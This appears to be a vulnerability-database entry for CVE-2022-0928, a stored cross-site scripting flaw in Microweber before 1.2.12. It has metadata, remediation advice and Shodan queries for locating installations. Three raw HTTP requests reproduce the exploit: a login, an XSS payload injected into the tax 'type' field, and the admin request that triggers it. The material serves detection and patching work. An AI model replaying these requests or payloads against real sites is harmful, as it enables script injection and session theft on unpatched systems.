---
layout: post
cve_id: CVE-2022-0928
title: Microweber < 1.2.12 - Stored Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2022/CVE-2022-0928.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-0928.yaml
snort2_rule: N/A
snort3_rule: N/A
author: amit-jd
severity: medium
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute malicious scripts in the context of the victim''s browser, potentially leading
  to session hijacking, defacement, or theft of sensitive information.

  '
remediation: 'Upgrade Microweber to version 1.2.12 or later to mitigate this vulnerability.

  '
reference:
- https://huntr.dev/bounties/085aafdd-ba50-44c7-9650-fa573da29bcd
- https://github.com/microweber/microweber/commit/fc9137c031f7edec5f50d73b300919fb519c924a
- https://nvd.nist.gov/vuln/detail/CVE-2022-0928
- https://github.com/ARPSyndicate/cvemon
- https://github.com/ARPSyndicate/kenzer-templates
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 5.4
  cve-id: CVE-2022-0928
  cwe-id: CWE-79
  epss-score: 0.04739
  epss-percentile: 0.89084
  cpe: cpe:2.3:a:microweber:microweber:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 3
  vendor: microweber
  product: microweber
  shodan-query:
  - http.favicon.hash:780351152
  - http.html:"microweber"
  fofa-query:
  - body="microweber"
  - icon_hash=780351152
tags:
- cve2022
- cve
- authenticated
- huntr
- xss
- microweber
- cms
- vuln
---

## ðŸ” Vulnerability Description
Microweber prior to 1.2.12 contains a stored cross-site scripting vulnerability via the Type parameter in the body of POST request, which is triggered by Add/Edit Tax.


## ðŸŒ HTTP Request
```nohighlight
POST /api/user_login HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/3.6.9
Connection: close
Content-Length: 31
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

username=7V1UIg&password=ZIQWRS
```

```nohighlight
POST /api/shop/save_tax_item HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-en) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4
Connection: close
Content-Length: 76
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://www.victim.com/admin/view:settings
Accept-Encoding: gzip

id=0&name=vat1&type="><img+src%3dx+onerror%3dalert(document.domain)>&rate=10
```

```nohighlight
POST /module HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Connection: close
Content-Length: 232
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://www.victim.com/admin/view:settings
Accept-Encoding: gzip

class=+module+module-shop-taxes-admin-list-taxes+&id=mw_admin_shop_taxes_items_list&parent-module-id=settings-admin-mw-main-module-backend-shop-taxes-admin&parent-module=shop%2Ftaxes%2Fadmin&data-type=shop%2Ftaxes%2Fadmin_list_taxes
```

